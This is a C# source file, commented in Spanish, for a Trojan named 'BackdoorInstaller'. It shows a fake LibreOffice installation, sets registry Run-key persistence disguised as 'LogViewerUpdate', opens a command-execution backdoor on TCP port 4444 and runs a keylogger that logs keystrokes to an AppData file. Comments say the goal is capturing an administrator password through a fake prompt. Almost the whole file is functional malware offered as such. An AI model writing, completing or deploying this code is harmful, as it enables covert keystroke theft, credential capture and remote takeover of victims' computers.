using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms; // Necesitas referenciar System.Windows.Forms si usas Forms, 
                            // pero para simplificar y no depender de UI pesada, usaremos Console y API nativa.

namespace BackdoorInstaller
{
    class Program
    {
        // Variables globales para el keylogger y el servidor
        private static string logFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "log_viewer.dat");
        private static string credsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "admin_creds.txt");
        private static Thread serverThread;

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        const int VK_BACK = 0x08;
        const int VK_TAB = 0x09;
        const int VK_RETURN = 0x0D;
        const int VK_SHIFT = 0x10;
        const int VK_CONTROL = 0x11;
        const int VK_MENU = 0x12;
        const int VK_CAPITAL = 0x14;
        const int VK_ESCAPE = 0x1B;
        const int VK_SPACE = 0x20;
        const int VK_PRIOR = 0x21;
        const int VK_NEXT = 0x21;
        const int VK_END = 0x23;
        const int VK_HOME = 0x24;
        const int VK_LEFT = 0x25;
        const int VK_UP = 0x26;
        const int VK_RIGHT = 0x27;
        const int VK_DOWN = 0x28;
        const int VK_SNAPSHOT = 0x2C;
        const int VK_INSERT = 0x2D;
        const int VK_DELETE = 0x2E;

        static void Main(string[] args)
        {
            // 1. SIMULACIÓN DE INSTALACIÓN DE LIBREOFFICE
            Console.WriteLine("Instalando LibreOffice... Por favor espere.");
            for (int i = 0; i <= 100; i += 5)
            {
                Console.SetCursorPosition(0, 1);
                Console.Write($"Progreso: {i}%");
                Thread.Sleep(50);
            }
            Console.WriteLine("\n¡Instalación completada!");
            Thread.Sleep(1000);

            // 2. PERSISTENCIA (Registro)
            try
            {
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)
                    .SetValue("LogViewerUpdate", Application.ExecutablePath);
            }
            catch { }

            // 3. INICIAR SERVIDOR BACKDOOR (Puerto 4444)
            serverThread = new Thread(RunServer);
            serverThread.IsBackground = true;
            serverThread.Start();

            // 4. INICIAR KEYLOGGER Y CAPTURA DE CONTRASEÑAS
            MonitorKeys();
        }

        static void MonitorKeys()
        {
            while (true)
            {
                for (int i = 0; i < 256; i++)
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        ProcessKey(i);
                    }
                }
                Thread.Sleep(10);
            }
        }

        static void ProcessKey(int key)
        {
            string text = "";
            
            // Manejo de teclas especiales
            if (key == VK_RETURN) text = "[ENTER]\n";
            else if (key == VK_BACK) text = "[BACKSPACE]";
            else if (key == VK_TAB) text = "[TAB]";
            else if (key == VK_SPACE) text = " ";
            else if (key >= 65 && key <= 90) // A-Z
            {
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps = (GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                char c = (char)key;
                if ((shift && !caps) || (!shift && caps)) c = char.ToUpper(c);
                else if (shift && caps) c = char.ToLower(c);
                else c = char.ToLower(c); // Simplificación
                
                // Si estamos pidiendo contraseña, capturamos todo tal cual hasta Enter
                text = c.ToString();
            }
            else if (key >= 48 && key <= 57) // 0-9
            {
                 bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                 text = shift ? GetShiftedNumber(key) : ((char)(key)).ToString();
            }
            else
            {
                // Caracteres normales ASCII
                if (key < 128 && char.IsControl((char)key) == false)
                    text = ((char)key).ToString();
            }

            // Lógica específica para capturar la "contraseña de admin"
            // Simulamos que el usuario escribe en una ventana emergente falsa
            // Guardamos todo en un buffer temporal si detectamos que estamos en modo "input"
            // Para simplificar este ejemplo, guardamos TODO en el log y filtramos después.
            
            File.AppendAllText(logFile, text);
        }

        static string GetShiftedNumber(int key)
        {
            switch(key)
            {
                case 48: return ")";
                case 49: return "!";
                case 50: return "@";
                case 51: return "#";
                case 52: return "$";
                case 53: return "%";
                case 54: return "&";
                case 55: return "*";
                case 56: return "(";
                case 57: return "";
                default: return ((char)key).ToString();
            }
        }

        static void RunServer()
        {
            TcpListener server = new TcpListener(IPAddress.Any, 4444);
            server.Start();
            Console.WriteLine("[DEBUG] Backdoor activo en puerto 4444");

            while (true)
            {
                TcpClient client = server.AcceptTcpClient();
                NetworkStream stream = client.GetStream();
                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                
                string output = ExecuteCommand(command.Trim());
                
                byte[] response = Encoding.ASCII.GetBytes(output);
                stream.Write(response, 0, response.Length);
                stream.Flush();
                client.Close();
            }
        }

        static string ExecuteCommand(string cmd)
        {
            try
            {
                // Ejecutar comando y devolver salida
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C " + cmd);
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                Process p = Process.Start(psi);
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return outStr;
            }
            catch (Exception e)
            {
                return "Error: " + e.Message;
            }
        }
        
        // Método auxiliar para simular la petición de contraseña
        public static void PromptAdminPassword()
        {
            // En un escenario real, esto se lanzaría como un hilo o evento
            // Aquí lo simulamos mostrando un mensaje en consola o creando un proceso hijo
            // Para la demo, asumimos que el keylogger ya capturará lo que el usuario escriba 
            // cuando aparezca la ventana falsa.
        }
    }
}